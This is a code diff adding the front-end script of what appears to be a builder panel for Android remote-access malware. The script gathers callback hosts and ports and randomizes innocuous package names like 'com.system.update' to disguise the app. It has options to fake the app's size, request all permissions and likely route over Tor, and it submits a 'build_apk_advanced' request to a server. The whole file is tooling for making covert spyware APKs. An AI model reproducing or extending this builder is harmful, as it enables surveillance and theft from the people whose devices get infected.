+  var el=document.createElement('div');el.className='dns-entry';el.dataset.value=host+':'+port;
+  el.innerHTML='<div class="dns-dot"></div>'+host+':'+port;
+  list.appendChild(el);document.getElementById('input-host').value='';
+}
+
+function removeDnsEntry(){var c=document.getElementById('dns-entries');if(c.lastChild)c.removeChild(c.lastChild)}
+
+function stepPort(delta){var inp=document.getElementById('input-port');inp.value=Math.min(65535,Math.max(1,(parseInt(inp.value)||7777)+delta))}
+
+function thorToggle(el){el.classList.toggle('checked')}
+
+function randomizeVersion(){var v=function(){return Math.floor(Math.random()*10)};document.getElementById('input-appversion').value=v()+'.'+v()}
+function randomizePackage(){var w=['system','service','manager','update','core','sync','data','secure','base','util'];var w1=w[Math.floor(Math.random()*w.length)];var w2=w[Math.floor(Math.random()*w.length)];document.getElementById('input-packagename').value='com.'+w1+'.'+w2}
+
+var base64Icon=null;
+function previewIcon(input,boxId){
+  if(!input.files||!input.files[0])return;
+  var reader=new FileReader();
+  reader.onload=function(e){document.getElementById(boxId).innerHTML='<img src="'+e.target.result+'" alt="icon">';base64Icon=e.target.result};
+  reader.readAsDataURL(input.files[0]);
+}
+
+function toggleAllPerms(){
+  var t=document.getElementById('toggle-allperms');
+  var list=document.getElementById('perm-list');list.innerHTML='';
+  if(t.classList.contains('checked')){
+    var sel=document.getElementById('perms-dropdown');
+    Array.from(sel.options).forEach(function(opt){if(opt.value)addPermEntry(opt.value)});
+  }
+}
+
+function addPermission(){
+  var sel=document.getElementById('perms-dropdown');if(!sel.value)return;
+  var list=document.getElementById('perm-list');
+  var existing=Array.from(list.querySelectorAll('.perm-entry')).map(function(e){return e.dataset.perm});
+  if(existing.indexOf(sel.value)!==-1)return;
+  addPermEntry(sel.value);
+}
+
+function addPermEntry(name){
+  var list=document.getElementById('perm-list');
+  var el=document.createElement('div');el.className='perm-entry';el.dataset.perm=name;
+  el.innerHTML='<div class="perm-dot"></div>'+name;
+  el.onclick=function(){list.querySelectorAll('.perm-entry').forEach(function(e){e.classList.remove('selected')});el.classList.add('selected')};
+  list.appendChild(el);
+}
+
+function removePermission(){var sel=document.querySelector('.perm-entry.selected');if(sel)sel.remove()}
+
+var buildLog=document.getElementById('build-log');
+function log(msg){var div=document.createElement('div');div.style.marginBottom='5px';div.textContent='> '+msg;buildLog.appendChild(div);buildLog.scrollTop=buildLog.scrollHeight}
+
+document.getElementById('start-build-btn').onclick=function(){
+  var dnsList=Array.from(document.querySelectorAll('.dns-entry')).map(function(e){return e.dataset.value});
+  if(dnsList.length===0){
+    var host=document.getElementById('input-host').value.trim();
+    var port=document.getElementById('input-port').value.trim();
+    if(host&&port)dnsList.push(host+':'+port);
+  }
+  if(dnsList.length===0){alert('Add at least one connection entry!');return}
+  buildLog.innerHTML='// STARTING BUILD PROCESS...<br>';
+  var config={
+    hosts:dnsList.join(','),
+    appName:document.getElementById('input-appname').value,
+    appVersion:document.getElementById('input-appversion').value,
+    packageName:document.getElementById('input-packagename').value,
+    notifText:document.getElementById('input-notif-text').value,
+    notifEnabled:document.getElementById('toggle-notif').classList.contains('checked'),
+    fakeSize:document.getElementById('toggle-fake-size').classList.contains('checked')?parseInt(document.getElementById('input-fake-size').value):0,
+    icon:base64Icon,
+    permissions:document.getElementById('toggle-allperms').classList.contains('checked')?'ALL':Array.from(document.querySelectorAll('.perm-entry')).map(function(e){return e.dataset.perm})
+  };
+  socket.emit('build_apk_advanced',config);
+};
+
+socket.on('build_log',function(data){data.split('\n').forEach(function(line){if(line.trim())log(line)})});
+socket.on('build_success',function(file){log('SUCCESS: '+file+' generated.')});
+
+!function tick(){var d=new Date();document.getElementById('clock').textContent=d.toISOString().replace('T',' ').slice(0,19)+' UTC';setTimeout(tick,1000)}();
+</script>
+</body>
+</html>
